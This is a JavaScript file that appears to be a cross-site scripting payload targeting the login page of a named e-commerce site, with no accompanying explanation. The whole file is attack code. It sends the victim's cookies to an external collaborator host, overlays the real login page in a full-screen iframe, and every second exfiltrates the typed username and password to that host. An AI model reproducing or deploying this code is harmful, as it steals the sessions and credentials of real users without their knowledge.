let currSession = "";
fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
fetch('https://selar.co/login', {method: 'GET'});
document.body.style.setProperty('height', '100vh');
const iframe = document.createElement('iframe');
iframe.src = 'https://selar.co/login';
iframe.width = '100%';
iframe.height = '100%'; 
iframe.style.border = 'none';
iframe.onload = function () {
    iframe.contentWindow.addEventListener('keydown', (event) => {
    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${currSession}`, {mode: 'no-cors',});
});
};
document.body.appendChild(iframe);
let old_username = ""
let old_password = ""
setInterval(()=> {
    const iframe = document.querySelector('iframe');
    const element = iframe.contentDocument.evaluate('/html/body/div[1]/div[2]/div[1]/div[2]/div/div[2]/div[1]/input', iframe.contentDocument, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
    if (element.value != old_username || iframe.contentDocument.getElementById('password').value !=  old_password) {
        fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/Password?username:${element.value}--direct-password-${iframe.contentDocument.getElementById('password').value }`)
        old_username = element.value;
        old_password = iframe.contentDocument.getElementById('password').value;
    }    
}, 1000)


